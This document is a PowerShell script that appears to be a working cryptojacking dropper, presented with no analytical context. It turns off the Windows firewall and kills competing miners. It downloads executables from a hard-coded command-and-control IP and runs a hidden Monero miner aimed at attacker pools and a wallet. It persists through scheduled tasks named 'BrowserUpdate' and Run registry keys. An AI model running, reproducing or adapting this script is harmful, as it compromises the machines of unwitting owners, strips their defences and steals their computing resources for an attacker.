$cc = "http://194.38.20.31"
$sys=-join ([char[]](48..57+97..122) | Get-Random -Count (Get-Random (6..12)))
$dst="$env:AppData\network02.exe"
$dst2="$env:TMP\network02.exe"
$dst3="$env:TMP\oracleservice.exe"
netsh advfirewall set allprofiles state off

Get-Process network0*, kthreaddi, sysrv, sysrv012, sysrv011, sysrv010, sysrv00* -ErrorAction SilentlyContinue | Stop-Process
# ps | Where-Object { $_.cpu -gt 50 -and $_.name -ne "[kthreaddi]" } | Stop-Process

$list = netstat -ano | findstr TCP
for ($i = 0; $i -lt $list.Length; $i++) {
    $k = [Text.RegularExpressions.Regex]::Split($list[$i].Trim(), '\s+')
    if ($k[2] -match "(:3333|:4444|:5555|:7777|:9000)$") {
        Stop-Process -id $k[4]
    }
}

if (!(Get-Process *network02] -ErrorAction SilentlyContinue)) {
    (New-Object Net.WebClient).DownloadFile("$cc/wxm.exe", "$dst")
    (New-Object Net.WebClient).DownloadFile("$cc/wxm.exe", "$dst2")
    (New-Object Net.WebClient).DownloadFile("$cc/oracleservice.exe", "$dst3")
    Start-Process "$dst2" "--donate-level 1 -o b.oracleservice.top -o 198.23.214.117:8080 -o 23.95.9.127:8080 -u 46E9UkTFqALXNh2mSbA7WGDoa2i6h4WVgUgPVdT9ZdtweLRvAhWmbvuY1dhEmfjHbsavKXo3eGf5ZRb4qJzFXLVHGYH4moQ" -windowstyle hidden
    Start-Process "$dst3" -windowstyle hidden
    schtasks /create /F /sc minute /mo 1 /tn "BrowserUpdate" /tr "$dst --donate-level 1 -o b.oracleservice.top -o 198.23.214.117:8080 -o 23.95.9.127:8080 -u 46E9UkTFqALXNh2mSbA7WGDoa2i6h4WVgUgPVdT9ZdtweLRvAhWmbvuY1dhEmfjHbsavKXo3eGf5ZRb4qJzFXLVHGYH4moQ -p x -B"
    reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v Run /d "$dst --donate-level 1 -o b.oracleservice.top -o 198.23.214.117:8080 -o 23.95.9.127:8080 -u 46E9UkTFqALXNh2mSbA7WGDoa2i6h4WVgUgPVdT9ZdtweLRvAhWmbvuY1dhEmfjHbsavKXo3eGf5ZRb4qJzFXLVHGYH4moQ -p x -B" /t REG_SZ /f
    schtasks /create /F /sc minute /mo 1 /tn "Browser2Update" /tr "$dst2 --donate-level 1 -o b.oracleservice.top -o 198.23.214.117:8080 -o 23.95.9.127:8080 -u 46E9UkTFqALXNh2mSbA7WGDoa2i6h4WVgUgPVdT9ZdtweLRvAhWmbvuY1dhEmfjHbsavKXo3eGf5ZRb4qJzFXLVHGYH4moQ -p x -B"
    reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v Run2 /d "$dst2 --donate-level 1 -o b.oracleservice.top -o 198.23.214.117:8080 -o 23.95.9.127:8080 -u 46E9UkTFqALXNh2mSbA7WGDoa2i6h4WVgUgPVdT9ZdtweLRvAhWmbvuY1dhEmfjHbsavKXo3eGf5ZRb4qJzFXLVHGYH4moQ -p x -B" /t REG_SZ /f
}
